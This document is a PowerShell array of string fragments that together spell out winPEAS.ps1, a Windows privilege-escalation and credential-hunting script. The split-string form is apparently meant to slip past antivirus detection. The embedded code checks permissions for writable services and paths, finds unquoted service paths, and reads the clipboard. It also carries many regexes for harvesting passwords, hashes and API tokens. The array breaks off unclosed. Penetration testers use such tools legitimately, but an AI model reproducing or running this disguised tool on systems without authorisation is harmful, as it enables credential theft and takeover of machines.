$fragments = @('<#
.SYNOPSIS
  Po','werShell adaptati','on of WinPEAS.exe',' / WinPeas.bat
.D','ESCRIPTION
  For ','the legal enumera','tion of windows b','ased computers th','at you either own',' or are approved ','to run this scrip','t on
.EXAMPLE
  #',' Default - normal',' operation with u','sername/password ','audit in drives/r','egistry
  .\winPe','as.ps1

  # Inclu','de Excel files in',' search: .xls, .x','lsx, .xlsm
  .\wi','nPeas.ps1 -Excel
','
  # Full audit -',' normal operation',' with APIs / Keys',' / Tokens
  ## Th','is will produce f','alse positives ##',' 
  .\winPeas.ps1',' -FullCheck 

  #',' Add Time stamps ','to each command
 ',' .\winPeas.ps1 -T','imeStamp

.NOTES
','  Version:       ','             1.3
','  PEASS-ng Origin','al Author:   PEAS','S-ng
  winPEAS.ps','1 Author:        ',' @RandolphConley
','  Creation Date: ','             10/4','/2022
  Website: ','                 ','  https://github.','com/peass-ng/PEAS','S-ng

  TESTED: P','oSh 5,7
  UNTESTE','D: PoSh 3,4
  NOT',' FULLY COMPATIBLE',': PoSh 2 or lower','
#>

############','############ FUNC','TIONS ###########','#############

[C','mdletBinding()]
p','aram(
  [switch]$','TimeStamp,
  [swi','tch]$FullCheck,
 ',' [switch]$Excel
)','

# Gather KB fro','m all patches ins','talled
function r','eturnHotFixID {
 ',' param(
    [stri','ng]$title
  )
  #',' Match on KB or i','f patch does not ','have a KB, return',' end result
  if ','(($title | Select','-String -AllMatch','es -Pattern ''KB(\','d{4,6})'').Matches','.Value) {
    ret','urn (($title | Se','lect-String -AllM','atches -Pattern ''','KB(\d{4,6})'').Mat','ches.Value)
  }
 ',' elseif (($title ','| Select-String -','NotMatch -Pattern',' ''KB(\d{4,6})'').M','atches.Value) {
 ','   return (($titl','e | Select-String',' -NotMatch -Patte','rn ''KB(\d{4,6})'')','.Matches.Value)
 ',' }
}

function St','art-ACLCheck {
  ','param(
    $Targe','t, $ServiceName)
','  # Gather ACL of',' object
  if ($nu','ll -ne $target) {','
    try {
      ','$ACLObject = Get-','Acl $target -Erro','rAction SilentlyC','ontinue
    }
   ',' catch { $null }
','    
    # If Fou','nd, Evaluate Perm','issions
    if ($','ACLObject) { 
   ','   $Identity = @(',')
      $Identity',' += "$env:COMPUTE','RNAME\$env:USERNA','ME"
      if ($AC','LObject.Owner -li','ke $Identity ) { ','Write-Host "$Iden','tity has ownershi','p of $Target" -Fo','regroundColor Red',' }
      # This s','hould now work fo','r any language. C','ommand runs whoam','i group, removes ','the first two lin','e of output, conv','erts from csv to ','object, but adds ','"group name" to t','he first column.
','      whoami.exe ','/groups /fo csv |',' select-object -s','kip 2 | ConvertFr','om-Csv -Header ''g','roup name'' | Sele','ct-Object -Expand','Property ''group n','ame'' | ForEach-Ob','ject { $Identity ','+= $_ }
      $Id','entityFound = $fa','lse
      foreach',' ($i in $Identity',') {
        $perm','ission = $ACLObje','ct.Access | Where','-Object { $_.Iden','tityReference -li','ke $i }
        $','UserPermission = ','""
        switch',' -WildCard ($Perm','ission.FileSystem','Rights) {
       ','   "FullControl" ','{ 
            $u','serPermission = "','FullControl"
    ','        $Identity','Found = $true 
  ','        }
       ','   "Write*" { 
  ','          $userPe','rmission = "Write','"
            $Id','entityFound = $tr','ue 
          }
 ','         "Modify"',' { 
            $','userPermission = ','"Modify"
        ','    $IdentityFoun','d = $true 
      ','    }
        }
 ','       Switch ($p','ermission.Registr','yRights) {
      ','    "FullControl"',' { 
            $','userPermission = ','"FullControl"
   ','         $Identit','yFound = $true 
 ','         }
      ','  }
        if ($','UserPermission) {','
          if ($S','erviceName) { Wri','te-Host "$Service','Name found with p','ermissions issue:','" -ForegroundColo','r Red }
         ',' Write-Host -Fore','groundColor red "','Identity $($permi','ssion.IdentityRef','erence) has ''$use','rPermission'' perm','s for $Target"
  ','      }
      }  ','  
      # Identi','ty Found Check - ','If False, loop th','rough and stop at',' root of drive
  ','    if ($Identity','Found -eq $false)',' {
        if ($T','arget.Length -gt ','3) {
          $T','arget = Split-Pat','h $Target
       ','   Start-ACLCheck',' $Target -Service','Name $ServiceName','
        }
      ','}
    }
    else ','{
      # If not ','found, split path',' one level and Ch','eck again
      $','Target = Split-Pa','th $Target
      ','Start-ACLCheck $T','arget $ServiceNam','e
    }
  }
}

fu','nction UnquotedSe','rvicePathCheck {
','  Write-Host "Fet','ching the list of',' services, this m','ay take a while..','."
  $services = ','Get-WmiObject -Cl','ass Win32_Service',' | 
    Where-Obj','ect { $_.PathName',' -inotmatch "`"" ','-and $_.PathName ','-inotmatch ":\\Wi','ndows\\" -and ($_','.StartMode -eq "A','uto" -or $_.Start','Mode -eq "Manual"',') -and ($_.State ','-eq "Running" -or',' $_.State -eq "St','opped") }
  if ($','($services | Meas','ure-Object).Count',' -lt 1) {
    Wri','te-Host "No unquo','ted service paths',' were found"
  }
','  else {
    $ser','vices | ForEach-O','bject {
      Wri','te-Host "Unquoted',' Service Path fou','nd!" -ForegroundC','olor red
      Wr','ite-Host Name: $_','.Name
      Write','-Host PathName: $','_.PathName
      ','Write-Host StartN','ame: $_.StartName',' 
      Write-Hos','t StartMode: $_.S','tartMode
      Wr','ite-Host Running:',' $_.State
    } 
','  }
}

function T','imeElapsed { 
  W','rite-Host "Time R','unning: $($stopwa','tch.Elapsed.Minut','es):$($stopwatch.','Elapsed.Seconds)"',' 
}

function Get','-ClipBoardText {
','  Add-Type -Assem','blyName Presentat','ionCore
  $text =',' [Windows.Clipboa','rd]::GetText()
  ','if ($text) {
    ','Write-Host ""
   ',' if ($TimeStamp) ','{ TimeElapsed }
 ','   Write-Host -Fo','regroundColor Blu','e "=========|| Cl','ipBoard text foun','d:"
    Write-Hos','t $text
  }
}

fu','nction Search-Exc','el {
  [cmdletbin','ding()]
  Param (','
      [parameter','(Mandatory, Value','FromPipeline)]
  ','    [ValidateScri','pt({
          Tr','y {
             ',' If (Test-Path -P','ath $_) {$True}
 ','             Else',' {Throw "$($_) is',' not a valid path','!"}
          }
 ','         Catch {
','              Thr','ow $_
          }','
      })]
      ','[string]$Source,
','      [parameter(','Mandatory)]
     ',' [string]$SearchT','ext
      #You ca','n specify wildcar','d characters (*, ','?)
  )
  $Excel =',' New-Object -ComO','bject Excel.Appli','cation
  Try {
  ','    $Source = Con','vert-Path $Source','
  }
  Catch {
  ','    Write-Warning',' "Unable locate f','ull path of $($So','urce)"
      BREA','K
  }
  $Workbook',' = $Excel.Workboo','ks.Open($Source)
','  ForEach ($Works','heet in @($Workbo','ok.Sheets)) {
   ','   # Find Method ','https://msdn.micr','osoft.com/en-us/v','ba/excel-vba/arti','cles/range-find-m','ethod-excel
     ',' $Found = $WorkSh','eet.Cells.Find($S','earchText)
      ','If ($Found) {
   ','     try{  
     ','     # Address Me','thod https://msdn','.microsoft.com/en','-us/vba/excel-vba','/articles/range-a','ddress-property-e','xcel
          Wr','ite-Host "Pattern',': ''$SearchText'' f','ound in $source" ','-ForegroundColor ','Blue
          $B','eginAddress = $Fo','und.Address(0,0,1',',1)
          #In','itial Found Cell
','          New-Obj','ect -TypeName PSO','bject -Property (','[Ordered]@{
     ','         WorkShee','t = $Worksheet.Na','me
              ','Column = $Found.C','olumn
           ','   Row =$Found.Ro','w
              T','extMatch = $Found','.Text
           ','   Address = $Beg','inAddress
       ','   })
          D','o {
             ',' $Found = $WorkSh','eet.Cells.FindNex','t($Found)
       ','       $Address =',' $Found.Address(0',',0,1,1)
         ','     If ($Address',' -eq $BeginAddres','s) {
            ','    Write-host "A','ddress is same as',' Begin Address"
 ','                 ','BREAK
           ','   }
            ','  New-Object -Typ','eName PSObject -P','roperty ([Ordered',']@{
             ','     WorkSheet = ','$Worksheet.Name
 ','                 ','Column = $Found.C','olumn
           ','       Row =$Foun','d.Row
           ','       TextMatch ','= $Found.Text
   ','               Ad','dress = $Address
','              }) ','               
 ','         } Until ','($False)
        ','}
        catch {','
          # Null',' expression in Fo','und
        }
   ','   }
      #Else ','{
      #    Writ','e-Warning "[$($Wo','rkSheet.Name)] No','thing Found!"
   ','   #}
  }
  try{
','  $workbook.close','($False)
  [void]','[System.Runtime.I','nteropServices.Ma','rshal]::ReleaseCo','mObject([System._','_ComObject]$excel',')
  [gc]::Collect','()
  [gc]::WaitFo','rPendingFinalizer','s()
  }
  catch{
','    #Usually an R','PC error
  }
  Re','move-Variable exc','el -ErrorAction S','ilentlyContinue
}','

#Get-CIMInstace','/Get-WMIObject ''W','in32_Product'' cal','ls kick off silen','t repairs on some',' programs causing',' potential issues',' after/while runn','ing this & doesn''','t always return a',' complete list.
#','Allegedly ''Win32r','eg_AddRemoveProgr','ams'' works fine n','ow but this metho','d ensures safety ','of target systems','.
function Get-In','stalledApplicatio','ns {
[cmdletbindi','ng()]
param(
  [P','arameter(DontShow',')]
  $keys = @(''''',',''\Wow6432Node'')
',')
  foreach($key ','in $keys) {
     ',' try {
        $a','pps = [Microsoft.','Win32.RegistryKey',']::OpenRemoteBase','Key(''LocalMachine',''',$env:COMPUTERNA','ME).OpenSubKey("S','OFTWARE$key\Micro','soft\Windows\Curr','entVersion\Uninst','all").GetSubKeyNa','mes()
      }
   ','   catch { 
     ','   Continue 
    ','  }
    foreach($','app in $apps) {
 ','       $program =',' [Microsoft.Win32','.RegistryKey]::Op','enRemoteBaseKey(''','LocalMachine'',$en','v:COMPUTERNAME).O','penSubKey("SOFTWA','RE$key\Microsoft\','Windows\CurrentVe','rsion\Uninstall\$','app")
        $na','me = $program.Get','Value(''DisplayNam','e'')
      if($nam','e) {
        New-','Object -TypeName ','PSObject -Propert','y ([Ordered]@{   ','    
            ','  Computername = ','$env:COMPUTERNAME','
              So','ftware = $name 
 ','             Vers','ion = $program.Ge','tValue("DisplayVe','rsion")
         ','     Publisher = ','$program.GetValue','("Publisher")
   ','           Instal','lDate = $program.','GetValue("Install','Date")
          ','    UninstallStri','ng = $program.Get','Value("UninstallS','tring")
         ','     Architecture',' = $(if($key -eq ','''\wow6432node'') {','''x86''}else{''x64''}',')
              P','ath = $program.Na','me
        })
   ','   }
    }
  }
}
','
function Write-C','olor([String[]]$T','ext, [ConsoleColo','r[]]$Color) {
  f','or ($i = 0; $i -l','t $Text.Length; $','i++) {
    Write-','Host $Text[$i] -F','oreground $Color[','$i] -NoNewline
  ','}
  Write-Host
}
','

#Write-Color " ','   ((,.,/((((((((','((((((((((((/,  *','/" -Color Green
W','rite-Color ",/*,.','.*(((((((((((((((','(((((((((((((((((','(," -Color Green
','Write-Color ",*/(','(((((((((((((((((','/,  .*//((//**, .','*((((((*" -Color ','Green
Write-Color',' "(((((((((((((((','(", "* *****,,,",',' "\########## .(*',' ,((((((" -Color ','Green, Blue, Gree','n
Write-Color "((','(((((((((", "/***','****************"',', "####### .(. ((','((((" -Color Gree','n, Blue, Green
Wr','ite-Color "((((((','(", "/***********','*******", "/@@@@@','/", "***", "\####','###\((((((" -Colo','r Green, Blue, Wh','ite, Blue, Green
','Write-Color ",,..','", "*************','*********", "/@@@','@@@@@@/", "***", ','",#####.\/(((((" ','-Color Green, Blu','e, White, Blue, G','reen
Write-Color ','", ,", "*********','*************", "','/@@@@@+@@@/", "**','*******", "##((/ ','/((((" -Color Gre','en, Blue, White, ','Blue, Green
Write','-Color "..(((####','######", "*******','**", "/#@@@@@@@@@','/", "************','*", ",,..((((" -C','olor Green, Blue,',' White, Blue, Gre','en
Write-Color ".','(((##############','##(/", "******", ','"/@@@@@/", "*****','***********", "..',' /((" -Color Gree','n, Blue, White, B','lue, Green
Write-','Color ".((#######','#################','(/", "***********','*************", "','..*(" -Color Gree','n, Blue, Green
Wr','ite-Color ".((###','#################','#########(/", "**','*****************','*", ".,(" -Color ','Green, Blue, Gree','n
Write-Color ".(','(################','#################','#(/", "**********','*****", "..(" -Co','lor Green, Blue, ','Green
Write-Color',' ".((############','#################','#########(/", "**','*********", "..("',' -Color Green, Bl','ue, Green
Write-C','olor ".((######",',' "(,.***.,(", "##','#################','", "(..***", "(/*','********", "..(" ','-Color Green, Gre','en, Green, Green,',' Blue, Green
Writ','e-Color ".((#####','#*", "(####((", "','#################','##", "((######", ','"/(********", "..','(" -Color Green, ','Green, Green, Gre','en, Blue, Green
W','rite-Color ".((##','################"',', "(/**********("',', "##############','##(**...(" -Color',' Green, Green, Gr','een
Write-Color "','.(((#############','#######", "/*****','**(", "##########','#########.((((" -','Color Green, Gree','n, Green
Write-Co','lor ".(((((######','#################','#################','####/  /((" -Colo','r Green
Write-Col','or "..(((((######','#################','#################','#(..(((((." -Colo','r Green
Write-Col','or "....(((((####','#################','################(',' .((((((." -Color',' Green
Write-Colo','r "......(((((###','#################','#############( .(','((((((." -Color G','reen
Write-Color ','"(((((((((. ,(###','#################','########(../(((((','((((." -Color Gre','en
Write-Color " ',' (((((((((/,  ,##','#################','#(/..((((((((((."',' -Color Green
Wri','te-Color "       ',' (((((((((/,.  ,*','//////*,. ./(((((','((((((." -Color G','reen
Write-Color ','"           (((((','(((((((((((((((((','(((((/" -Color Gr','een
Write-Color "','          by PEAS','S-ng & RandolphCo','nley" -Color Gree','n

##############','########## VARIAB','LES #############','###########

# Ma','nually added Rege','x search strings ','from https://gith','ub.com/peass-ng/P','EASS-ng/blob/mast','er/build_lists/se','nsitive_files.yam','l

# Set these va','lues to true to a','dd them to the re','gex search by def','ault
$password = ','$true
$username =',' $true
$webAuth =',' $true

$regexSea','rch = @{}

if ($p','assword) {
  $reg','exSearch.add("Sim','ple Passwords1", ','"pass.*[=:].+")
 ',' $regexSearch.add','("Simple Password','s2", "pwd.*[=:].+','")
  $regexSearch','.add("Apr1 MD5", ','''\$apr1\$[a-zA-Z0','-9_/\.]{8}\$[a-zA','-Z0-9_/\.]{22}'')
','  $regexSearch.ad','d("Apache SHA", "','\{SHA\}[0-9a-zA-Z','/_=]{10,}")
  $re','gexSearch.add("Bl','owfish", ''\$2[abx','yz]?\$[0-9]{2}\$[','a-zA-Z0-9_/\.]*'')','
  $regexSearch.a','dd("Drupal", ''\$S','\$[a-zA-Z0-9_/\.]','{52}'')
  $regexSe','arch.add("Joomlav','bulletin", "[0-9a','-zA-Z]{32}:[a-zA-','Z0-9_]{16,32}")
 ',' $regexSearch.add','("Linux MD5", ''\$','1\$[a-zA-Z0-9_/\.',']{8}\$[a-zA-Z0-9_','/\.]{22}'')
  $reg','exSearch.add("php','bb3", ''\$H\$[a-zA','-Z0-9_/\.]{31}'')
','  $regexSearch.ad','d("sha512crypt", ','''\$6\$[a-zA-Z0-9_','/\.]{16}\$[a-zA-Z','0-9_/\.]{86}'')
  ','$regexSearch.add(','"Wordpress", ''\$P','\$[a-zA-Z0-9_/\.]','{31}'')
  $regexSe','arch.add("md5", "','(^|[^a-zA-Z0-9])[','a-fA-F0-9]{32}([^','a-zA-Z0-9]|$)")
 ',' $regexSearch.add','("sha1", "(^|[^a-','zA-Z0-9])[a-fA-F0','-9]{40}([^a-zA-Z0','-9]|$)")
  $regex','Search.add("sha25','6", "(^|[^a-zA-Z0','-9])[a-fA-F0-9]{6','4}([^a-zA-Z0-9]|$',')")
  $regexSearc','h.add("sha512", "','(^|[^a-zA-Z0-9])[','a-fA-F0-9]{128}([','^a-zA-Z0-9]|$)") ',' 
  # This does n','ot work correctly','
  #$regexSearch.','add("Base32", "(?',':[A-Z2-7]{8})*(?:','[A-Z2-7]{2}={6}|[','A-Z2-7]{4}={4}|[A','-Z2-7]{5}={3}|[A-','Z2-7]{7}=)?")
  $','regexSearch.add("','Base64", "(eyJ|YT','o|Tzo|PD[89]|aHR0','cHM6L|aHR0cDo|rO0',')[a-zA-Z0-9+\/]+=','{0,2}")
}

if ($u','sername) {
  $reg','exSearch.add("Use','rnames1", "userna','me[=:].+")
  $reg','exSearch.add("Use','rnames2", "user[=',':].+")
  $regexSe','arch.add("Usernam','es3", "login[=:].','+")
  $regexSearc','h.add("Emails", "','[A-Za-z0-9._%+-]+','@[A-Za-z0-9.-]+\.','[A-Za-z]{2,6}")
 ',' $regexSearch.add','("Net user add", ','"net user .+ /add','")
}

if ($FullCh','eck) {
  $regexSe','arch.add("Artifac','tory API Token", ','"AKC[a-zA-Z0-9]{1','0,}")
  $regexSea','rch.add("Artifact','ory Password", "A','P[0-9ABCDEF][a-zA','-Z0-9]{8,}")
  $r','egexSearch.add("A','dafruit API Key",',' "([a-z0-9_-]{32}',')")
  $regexSearc','h.add("Adafruit A','PI Key", "([a-z0-','9_-]{32})")
  $re','gexSearch.add("Ad','obe Client Id (Oa','uth Web)", "(adob','e[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([a-f0-9]{32','})[''""]")
  $rege','xSearch.add("Abod','e Client Secret",',' "(p8e-)[a-z0-9]{','32}")
  $regexSea','rch.add("Age Secr','et Key", "AGE-SEC','RET-KEY-1[QPZRY9X','8GF2TVDW0S3JN54KH','CE6MUA7L]{58}")
 ',' $regexSearch.add','("Airtable API Ke','y", "([a-z0-9]{17','})")
  $regexSear','ch.add("Alchemi A','PI Key", "(alchem','i[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([a-zA-Z0-9-',']{32})[''""]")
  $','regexSearch.add("','Artifactory API K','ey & Password", "','[""'']AKC[a-zA-Z0-','9]{10,}[""'']|[""''',']AP[0-9ABCDEF][a-','zA-Z0-9]{8,}[""'']','")
  $regexSearch','.add("Atlassian A','PI Key", "(atlass','ian[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,','5}[''""]([a-z0-9]{','24})[''""]")
  $re','gexSearch.add("Bi','nance API Key", "','(binance[a-z0-9_ ','\.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-z','A-Z0-9]{64})[''""]','")
  $regexSearch','.add("Bitbucket C','lient Id", "((bit','bucket[a-z0-9_ \.',',\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).','{0,5}[''""]([a-z0-','9]{32})[''""])")
 ',' $regexSearch.add','("Bitbucket Clien','t Secret", "((bit','bucket[a-z0-9_ \.',',\-]{0,25})(=|>|:','=|\|\|:|<=|=>|:).','{0,5}[''""]([a-z0-','9_\-]{64})[''""])"',')
  $regexSearch.','add("BitcoinAvera','ge API Key", "(bi','tcoin.?average[a-','z0-9_ \.,\-]{0,25','})(=|>|:=|\|\|:|<','=|=>|:).{0,5}[''""',']([a-zA-Z0-9]{43}',')[''""]")
  $regex','Search.add("Bitqu','ery API Key", "(b','itquery[a-z0-9_ \','.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:)','.{0,5}[''""]([A-Za','-z0-9]{32})[''""]"',')
  $regexSearch.','add("Bittrex Acce','ss Key and Access',' Key", "([a-z0-9]','{32})")
  $regexS','earch.add("Birise',' API Key", "(bitr','ise[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,','5}[''""]([a-zA-Z0-','9_\-]{86})[''""]")','
  $regexSearch.a','dd("Block API Key','", "(block[a-z0-9','_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a','-z0-9]{4}-[a-z0-9',']{4}-[a-z0-9]{4}-','[a-z0-9]{4})[''""]','")
  $regexSearch','.add("Blockchain ','API Key", "mainne','t[a-zA-Z0-9]{32}|','testnet[a-zA-Z0-9',']{32}|ipfs[a-zA-Z','0-9]{32}")
  $reg','exSearch.add("Blo','ckfrost API Key",',' "(blockchain[a-z','0-9_ \.,\-]{0,25}',')(=|>|:=|\|\|:|<=','|=>|:).{0,5}[''""]','([a-f0-9]{8}-[a-f','0-9]{4}-[a-f0-9]{','4}-[a-f0-9]{4}-[0','-9a-f]{12})[''""]"',')
  $regexSearch.','add("Box API Key"',', "(box[a-z0-9_ \','.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:)','.{0,5}[''""]([a-zA','-Z0-9]{32})[''""]"',')
  $regexSearch.','add("Bravenewcoin',' API Key", "(brav','enewcoin[a-z0-9_ ','\.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-z','0-9]{50})[''""]")
','  $regexSearch.ad','d("Clearbit API K','ey", "sk_[a-z0-9]','{32}")
  $regexSe','arch.add("Clojars',' API Key", "(CLOJ','ARS_)[a-zA-Z0-9]{','60}")
  $regexSea','rch.add("Coinbase',' Access Token", "','([a-z0-9_-]{64})"',')
  $regexSearch.','add("Coinlayer AP','I Key", "(coinlay','er[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|','\|:|<=|=>|:).{0,5','}[''""]([a-z0-9]{3','2})[''""]")
  $reg','exSearch.add("Coi','nlib API Key", "(','coinlib[a-z0-9_ \','.,\-]{0,25})(=|>|',':=|\|\|:|<=|=>|:)','.{0,5}[''""]([a-z0','-9]{16})[''""]")
 ',' $regexSearch.add','("Confluent Acces','s Token & Secret ','Key", "([a-z0-9]{','16})")
  $regexSe','arch.add("Content','ful delivery API ','Key", "(contentfu','l[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([a-z0-9=_\-',']{43})[''""]")
  $','regexSearch.add("','Covalent API Key"',', "ckey_[a-z0-9]{','27}")
  $regexSea','rch.add("Charity ','Search API Key", ','"(charity.?search','[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[','''""]([a-z0-9]{32}',')[''""]")
  $regex','Search.add("Datab','ricks API Key", "','dapi[a-h0-9]{32}"',')
  $regexSearch.','add("DDownload AP','I Key", "(ddownlo','ad[a-z0-9_ \.,\-]','{0,25})(=|>|:=|\|','\|:|<=|=>|:).{0,5','}[''""]([a-z0-9]{2','2})[''""]")
  $reg','exSearch.add("Def','ined Networking A','PI token", "(dnke','y-[a-z0-9=_\-]{26','}-[a-z0-9=_\-]{52','})")
  $regexSear','ch.add("Discord A','PI Key, Client ID',' & Client Secret"',', "((discord[a-z0','-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""](','[a-h0-9]{64}|[0-9',']{18}|[a-z0-9=_\-',']{32})[''""])")
  ','$regexSearch.add(','"Droneci Access T','oken", "([a-z0-9]','{32})")
  $regexS','earch.add("Dropbo','x API Key", "sl.[','a-zA-Z0-9_-]{136}','")
  $regexSearch','.add("Doppler API',' Key", "(dp\.pt\.',')[a-zA-Z0-9]{43}"',')
  $regexSearch.','add("Dropbox API ','secret/key, short',' & long lived API',' Key", "(dropbox[','a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:','|<=|=>|:).{0,5}[''','""]([a-z0-9]{15}|','sl\.[a-z0-9=_\-]{','135}|[a-z0-9]{11}','(AAAAAAAAAA)[a-z0','-9_=\-]{43})[''""]','")
  $regexSearch','.add("Duffel API ','Key", "duffel_(te','st|live)_[a-zA-Z0','-9_-]{43}")
  $re','gexSearch.add("Dy','natrace API Key",',' "dt0c01\.[a-zA-Z','0-9]{24}\.[a-z0-9',']{64}")
  $regexS','earch.add("EasyPo','st API Key", "EZA','K[a-zA-Z0-9]{54}"',')
  $regexSearch.','add("EasyPost tes','t API Key", "EZTK','[a-zA-Z0-9]{54}")','
  $regexSearch.a','dd("Etherscan API',' Key", "(ethersca','n[a-z0-9_ \.,\-]{','0,25})(=|>|:=|\|\','|:|<=|=>|:).{0,5}','[''""]([A-Z0-9]{34','})[''""]")
  $rege','xSearch.add("Etsy',' Access Token", "','([a-z0-9]{24})")
','  $regexSearch.ad','d("Facebook Acces','s Token", "EAACEd','Eose0cBA[0-9A-Za-','z]+")
  $regexSea','rch.add("Fastly A','PI Key", "(fastly','[a-z0-9_ \.,\-]{0',',25})(=|>|:=|\|\|',':|<=|=>|:).{0,5}[','''""]([a-z0-9=_\-]','{32})[''""]")
  $r','egexSearch.add("F','inicity API Key &',' Client Secret", ','"(finicity[a-z0-9','_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a','-f0-9]{32}|[a-z0-','9]{20})[''""]")
  ','$regexSearch.add(','"Flickr Access To','ken", "([a-z0-9]{','32})")
  $regexSe','arch.add("Flutter','weave Keys", "FLW','PUBK_TEST-[a-hA-H','0-9]{32}-X|FLWSEC','K_TEST-[a-hA-H0-9',']{32}-X|FLWSECK_T','EST[a-hA-H0-9]{12','}")
  $regexSearc','h.add("Frame.io A','PI Key", "fio-u-[','a-zA-Z0-9_=\-]{64','}")
  $regexSearc','h.add("Freshbooks',' Access Token", "','([a-z0-9]{64})")
','  $regexSearch.ad','d("Github", "gith','ub(.{0,20})?[''""]','[0-9a-zA-Z]{35,40','}")
  $regexSearc','h.add("Github App',' Token", "(ghu|gh','s)_[0-9a-zA-Z]{36','}")
  $regexSearc','h.add("Github OAu','th Access Token",',' "gho_[0-9a-zA-Z]','{36}")
  $regexSe','arch.add("Github ','Personal Access T','oken", "ghp_[0-9a','-zA-Z]{36}")
  $r','egexSearch.add("G','ithub Refresh Tok','en", "ghr_[0-9a-z','A-Z]{76}")
  $reg','exSearch.add("Git','Hub Fine-Grained ','Personal Access T','oken", "github_pa','t_[0-9a-zA-Z_]{82','}")
  $regexSearc','h.add("Gitlab Per','sonal Access Toke','n", "glpat-[0-9a-','zA-Z\-]{20}")
  $','regexSearch.add("','GitLab Pipeline T','rigger Token", "g','lptt-[0-9a-f]{40}','")
  $regexSearch','.add("GitLab Runn','er Registration T','oken", "GR1348941','[0-9a-zA-Z_\-]{20','}")
  $regexSearc','h.add("Gitter Acc','ess Token", "([a-','z0-9_-]{40})")
  ','$regexSearch.add(','"GoCardless API K','ey", "live_[a-zA-','Z0-9_=\-]{40}")
 ',' $regexSearch.add','("GoFile API Key"',', "(gofile[a-z0-9','_ \.,\-]{0,25})(=','|>|:=|\|\|:|<=|=>','|:).{0,5}[''""]([a','-zA-Z0-9]{32})[''"','"]")
  $regexSear','ch.add("Google AP','I Key", "AIza[0-9','A-Za-z_\-]{35}")
','  $regexSearch.ad','d("Google Cloud P','latform API Key",',' "(google|gcp|you','tube|drive|yt)(.{','0,20})?[''""][AIza','[0-9a-z_\-]{35}][','''""]")
  $regexSe','arch.add("Google ','Drive Oauth", "[0','-9]+-[0-9A-Za-z_]','{32}\.apps\.googl','eusercontent\.com','")
  $regexSearch','.add("Google Oaut','h Access Token", ','"ya29\.[0-9A-Za-z','_\-]+")
  $regexS','earch.add("Google',' (GCP) Service-ac','count", """type.+',':.+""service_acco','unt")
  $regexSea','rch.add("Grafana ','API Key", "eyJrIj','oi[a-z0-9_=\-]{72',',92}")
  $regexSe','arch.add("Grafana',' cloud api token"',', "glc_[A-Za-z0-9','\+/]{32,}={0,2}")','
  $regexSearch.a','dd("Grafana servi','ce account token"',', "(glsa_[A-Za-z0','-9]{32}_[A-Fa-f0-','9]{8})")
  $regex','Search.add("Hashi','corp Terraform us','er/org API Key", ','"[a-z0-9]{14}\.at','lasv1\.[a-z0-9_=\','-]{60,70}")
  $re','gexSearch.add("He','roku API Key", "[','hH][eE][rR][oO][k','K][uU].{0,30}[0-9','A-F]{8}-[0-9A-F]{','4}-[0-9A-F]{4}-[0','-9A-F]{4}-[0-9A-F',']{12}")
  $regexS','earch.add("Hubspo','t API Key", "[''""','][a-h0-9]{8}-[a-h','0-9]{4}-[a-h0-9]{','4}-[a-h0-9]{4}-[a','-h0-9]{12}[''""]")','
  $regexSearch.a','dd("Instatus API ','Key", "(instatus[','a-z0-9_ \.,\-]{0,','25})(=|>|:=|\|\|:','|<=|=>|:).{0,5}[''','""]([a-z0-9]{32})','[''""]")
  $regexS','earch.add("Interc','om API Key & Clie','nt Secret/ID", "(','intercom[a-z0-9_ ','\.,\-]{0,25})(=|>','|:=|\|\|:|<=|=>|:',').{0,5}[''""]([a-z','0-9=_]{60}|[a-h0-','9]{8}-[a-h0-9]{4}','-[a-h0-9]{4}-[a-h','0-9]{4}-[a-h0-9]{','12})[''""]")
  $re','gexSearch.add("Io','nic API Key", "(i','onic[a-z0-9_ \.,\','-]{0,25})(=|>|:=|','\|\|:|<=|=>|:).{0',',5}[''""](ion_[a-z','0-9]{42})[''""]")
','  $regexSearch.ad','d("JSON Web Token','", "(ey[0-9a-z]{3','0,34}\.ey[0-9a-z\','/_\-]{30,}\.[0-9a','-zA-Z\/_\-]{10,}=','{0,2})")
  $regex','Search.add("Krake','n Access Token", ','"([a-z0-9\/=_\+\-',']{80,90})")
  $re','gexSearch.add("Ku','coin Access Token','", "([a-f0-9]{24}',')")
  $regexSearc','h.add("Kucoin Sec','ret Key", "([0-9a','-f]{8}-[0-9a-f]{4','}-[0-9a-f]{4}-[0-','9a-f]{4}-[0-9a-f]','{12})")
  $regexS','earch.add("Launch','darkly Access Tok','en", "([a-z0-9=_\','-]{40})")
  $rege','xSearch.add("Line','ar API Key", "(li','n_api_[a-zA-Z0-9]','{40})")
  $regexS','earch.add("Linear',' Client Secret/ID','", "((linear[a-z0','-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""](','[a-f0-9]{32})[''""','])")
  $regexSear','ch.add("LinkedIn ','Client ID", "link','edin(.{0,20})?[''"','"][0-9a-z]{12}[''"','"]")
  $regexSear','ch.add("LinkedIn ','Secret Key", "lin','kedin(.{0,20})?[''','""][0-9a-z]{16}[''','""]")
  $regexSea','rch.add("Lob API ','Key", "((lob[a-z0','-9_ \.,\-]{0,25})','(=|>|:=|\|\|:|<=|','=>|:).{0,5}[''""](','(live|test)_[a-f0','-9]{35})[''""])|((','lob[a-z0-9_ \.,\-',']{0,25})(=|>|:=|\','|\|:|<=|=>|:).{0,','5}[''""]((test|liv','e)_pub_[a-f0-9]{3','1})[''""])")
